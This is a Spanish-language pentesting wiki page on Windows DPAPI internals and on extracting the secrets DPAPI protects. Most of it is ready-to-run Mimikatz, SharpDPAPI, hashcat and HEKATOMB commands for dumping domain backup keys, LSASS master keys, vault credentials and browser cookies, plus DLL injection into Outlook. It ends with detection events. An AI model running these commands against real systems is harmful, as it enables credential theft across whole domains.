# DPAPI - Extracción de Contraseñas

{{#include ../../banners/hacktricks-training.md}}



## ¿Qué es DPAPI?

La API de Protección de Datos (DPAPI) se utiliza principalmente dentro del sistema operativo Windows para la **encriptación simétrica de claves privadas asimétricas**, aprovechando secretos de usuario o del sistema como una fuente significativa de entropía. Este enfoque simplifica la encriptación para los desarrolladores al permitirles encriptar datos utilizando una clave derivada de los secretos de inicio de sesión del usuario o, para la encriptación del sistema, los secretos de autenticación del dominio del sistema, eliminando así la necesidad de que los desarrolladores gestionen la protección de la clave de encriptación ellos mismos.

La forma más común de usar DPAPI es a través de las funciones **`CryptProtectData` y `CryptUnprotectData`**, que permiten a las aplicaciones encriptar y desencriptar datos de manera segura con la sesión del proceso que actualmente ha iniciado sesión. Esto significa que los datos encriptados solo pueden ser desencriptados por el mismo usuario o sistema que los encriptó.

Además, estas funciones también aceptan un **parámetro `entropy`** que también se utilizará durante la encriptación y desencriptación, por lo tanto, para desencriptar algo encriptado utilizando este parámetro, debes proporcionar el mismo valor de entropía que se utilizó durante la encriptación.

### Generación de claves de usuario

DPAPI genera una clave única (llamada **`pre-key`**) para cada usuario basada en sus credenciales. Esta clave se deriva de la contraseña del usuario y otros factores, y el algoritmo depende del tipo de usuario, pero termina siendo un SHA1. Por ejemplo, para usuarios de dominio, **depende del hash HTLM del usuario**.

Esto es especialmente interesante porque si un atacante puede obtener el hash de la contraseña del usuario, puede:

- **Desencriptar cualquier dato que fue encriptado usando DPAPI** con la clave de ese usuario sin necesidad de contactar ninguna API.
- Intentar **romper la contraseña** fuera de línea tratando de generar la clave DPAPI válida.

Además, cada vez que un usuario encripta datos usando DPAPI, se genera una nueva **clave maestra**. Esta clave maestra es la que se utiliza realmente para encriptar datos. Cada clave maestra se asigna con un **GUID** (Identificador Único Global) que la identifica.

Las claves maestras se almacenan en el directorio **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, donde `{SID}` es el Identificador de Seguridad de ese usuario. La clave maestra se almacena encriptada por el **`pre-key`** del usuario y también por una **clave de respaldo de dominio** para recuperación (por lo que la misma clave se almacena encriptada 2 veces por 2 contraseñas diferentes).

Ten en cuenta que la **clave de dominio utilizada para encriptar la clave maestra está en los controladores de dominio y nunca cambia**, por lo que si un atacante tiene acceso al controlador de dominio, puede recuperar la clave de respaldo de dominio y desencriptar las claves maestras de todos los usuarios en el dominio.

Los blobs encriptados contienen el **GUID de la clave maestra** que se utilizó para encriptar los datos dentro de sus encabezados.

> [!TIP]
> Los blobs encriptados de DPAPI comienzan con **`01 00 00 00`**

Encontrar claves maestras:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Esto es lo que un montón de Master Keys de un usuario se verá:

![](<../../images/image (1121).png>)

### Generación de claves de máquina/sistema

Esta es la clave utilizada por la máquina para cifrar datos. Se basa en el **DPAPI_SYSTEM LSA secret**, que es una clave especial a la que solo el usuario SYSTEM puede acceder. Esta clave se utiliza para cifrar datos que necesitan ser accesibles por el sistema mismo, como credenciales a nivel de máquina o secretos a nivel de sistema.

Tenga en cuenta que estas claves **no tienen una copia de seguridad de dominio**, por lo que solo son accesibles localmente:

- **Mimikatz** puede acceder a ella volcando secretos de LSA usando el comando: `mimikatz lsadump::secrets`
- El secreto se almacena dentro del registro, por lo que un administrador podría **modificar los permisos DACL para acceder a él**. La ruta del registro es: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Datos protegidos por DPAPI

Entre los datos personales protegidos por DPAPI se encuentran:

- Credenciales de Windows
- Contraseñas y datos de autocompletado de Internet Explorer y Google Chrome
- Contraseñas de cuentas de correo electrónico y FTP interno para aplicaciones como Outlook y Windows Mail
- Contraseñas para carpetas compartidas, recursos, redes inalámbricas y Windows Vault, incluidas claves de cifrado
- Contraseñas para conexiones de escritorio remoto, .NET Passport y claves privadas para varios propósitos de cifrado y autenticación
- Contraseñas de red gestionadas por Credential Manager y datos personales en aplicaciones que utilizan CryptProtectData, como Skype, MSN messenger y más
- Blobs cifrados dentro del registro
- ...

Los datos protegidos del sistema incluyen:
- Contraseñas de Wifi
- Contraseñas de tareas programadas
- ...

### Opciones de extracción de claves maestras

- Si el usuario tiene privilegios de administrador de dominio, puede acceder a la **clave de copia de seguridad de dominio** para descifrar todas las claves maestras de usuario en el dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegios de administrador local, es posible **acceder a la memoria de LSASS** para extraer las claves maestras de DPAPI de todos los usuarios conectados y la clave del SISTEMA.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si el usuario tiene privilegios de administrador local, puede acceder al **DPAPI_SYSTEM LSA secret** para descifrar las claves maestras de la máquina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si se conoce la contraseña o el hash NTLM del usuario, se puede **desencriptar las claves maestras del usuario directamente**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si estás dentro de una sesión como el usuario, es posible pedirle al DC la **clave de respaldo para descifrar las claves maestras usando RPC**. Si eres administrador local y el usuario ha iniciado sesión, podrías **robar su token de sesión** para esto:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lista de Cofres
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acceso a datos cifrados por DPAPI

### Encontrar datos cifrados por DPAPI

Los **archivos protegidos** comunes de los usuarios se encuentran en:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- También verifica cambiando `\Roaming\` a `\Local\` en las rutas anteriores.

Ejemplos de enumeración:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) puede encontrar blobs cifrados por DPAPI en el sistema de archivos, el registro y blobs B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Ten en cuenta que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (del mismo repositorio) se puede utilizar para descifrar datos sensibles como cookies utilizando DPAPI.

### Claves de acceso y datos

- **Usa SharpDPAPI** para obtener credenciales de archivos cifrados por DPAPI de la sesión actual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtener información de credenciales** como los datos encriptados y el guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Acceder a las claves maestras**:

Desencriptar una clave maestra de un usuario solicitando la **clave de respaldo del dominio** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
La herramienta **SharpDPAPI** también admite estos argumentos para la descifrado de la clave maestra (nota cómo es posible usar `/rpc` para obtener la clave de respaldo del dominio, `/password` para usar una contraseña en texto plano, o `/pvk` para especificar un archivo de clave privada del dominio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Desencriptar datos usando una clave maestra**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
La herramienta **SharpDPAPI** también admite estos argumentos para la decryption de `credentials|vaults|rdg|keepass|triage|blob|ps` (nota cómo es posible usar `/rpc` para obtener la clave de respaldo de los dominios, `/password` para usar una contraseña en texto plano, `/pvk` para especificar un archivo de clave privada de dominio DPAPI, `/unprotect` para usar la sesión del usuario actual...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Desencriptar algunos datos usando **la sesión del usuario actual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Manejo de Entropía Opcional ("Entropía de terceros")

Algunas aplicaciones pasan un valor adicional de **entropía** a `CryptProtectData`. Sin este valor, el blob no puede ser descifrado, incluso si se conoce la clave maestra correcta. Obtener la entropía es, por lo tanto, esencial al apuntar a credenciales protegidas de esta manera (por ejemplo, Microsoft Outlook, algunos clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) es un DLL en modo usuario que engancha las funciones de DPAPI dentro del proceso objetivo y registra de manera transparente cualquier entropía opcional que se proporcione. Ejecutar EntropyCapture en modo **DLL-injection** contra procesos como `outlook.exe` o `vpnclient.exe` generará un archivo que mapea cada buffer de entropía al proceso que llama y al blob. La entropía capturada puede ser suministrada más tarde a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) para descifrar los datos.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft introdujo un formato de masterkey **contexto 3** a partir de Windows 10 v1607 (2016). `hashcat` v6.2.6 (diciembre de 2023) agregó modos de hash **22100** (DPAPI masterkey v1 contexto), **22101** (contexto 1) y **22102** (contexto 3) que permiten el cracking acelerado por GPU de contraseñas de usuario directamente desde el archivo de masterkey. Por lo tanto, los atacantes pueden realizar ataques de lista de palabras o de fuerza bruta sin interactuar con el sistema objetivo.

`DPAPISnoop` (2024) automatiza el proceso:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
La herramienta también puede analizar blobs de Credenciales y Vault, descifrarlos con claves crackeadas y exportar contraseñas en texto claro.

### Acceder a datos de otras máquinas

En **SharpDPAPI y SharpChrome** puedes indicar la opción **`/server:HOST`** para acceder a los datos de una máquina remota. Por supuesto, necesitas poder acceder a esa máquina y en el siguiente ejemplo se supone que **se conoce la clave de cifrado de respaldo del dominio**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Otras herramientas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y computadoras del directorio LDAP y la extracción de la clave de respaldo del controlador de dominio a través de RPC. El script resolverá todas las direcciones IP de las computadoras y realizará un smbclient en todas las computadoras para recuperar todos los blobs de DPAPI de todos los usuarios y descifrar todo con la clave de respaldo del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

¡Con la lista de computadoras extraídas de LDAP puedes encontrar cada subred incluso si no las conocías!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar secretos protegidos por DPAPI automáticamente. La versión 2.x introdujo:

* Colección paralela de blobs desde cientos de hosts
* Análisis de **context 3** masterkeys e integración automática de cracking con Hashcat
* Soporte para cookies encriptadas "App-Bound" de Chrome (ver la siguiente sección)
* Un nuevo modo **`--snapshot`** para sondear repetidamente los puntos finales y diferenciar blobs recién creados

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) es un analizador en C# para archivos de masterkey/credential/vault que puede generar formatos de Hashcat/JtR y opcionalmente invocar el cracking automáticamente. Soporta completamente los formatos de masterkey de máquina y usuario hasta Windows 11 24H1.


## Detecciones comunes

- Acceso a archivos en `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` y otros directorios relacionados con DPAPI.
- Especialmente desde un recurso compartido de red como **C$** o **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** o herramientas similares para acceder a la memoria de LSASS o volcar masterkeys.
- Evento **4662**: *Se realizó una operación en un objeto* – puede correlacionarse con el acceso al objeto **`BCKUPKEY`**.
- Evento **4673/4674** cuando un proceso solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilidades y cambios en el ecosistema 2023-2025

* **CVE-2023-36004 – Suplantación de canal seguro de Windows DPAPI** (noviembre de 2023). Un atacante con acceso a la red podría engañar a un miembro del dominio para que recuperara una clave de respaldo de DPAPI maliciosa, permitiendo el descifrado de masterkeys de usuario. Corregido en la actualización acumulativa de noviembre de 2023 – los administradores deben asegurarse de que los DC y estaciones de trabajo estén completamente actualizados.
* La encriptación de cookies "App-Bound" de **Chrome 127** (julio de 2024) reemplazó la protección heredada solo de DPAPI con una clave adicional almacenada en el **Credential Manager** del usuario. El descifrado fuera de línea de las cookies ahora requiere tanto la masterkey de DPAPI como la **clave de aplicación vinculada envuelta en GCM**. SharpChrome v2.3 y DonPAPI 2.x pueden recuperar la clave adicional cuando se ejecutan con el contexto de usuario.


## Referencias

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
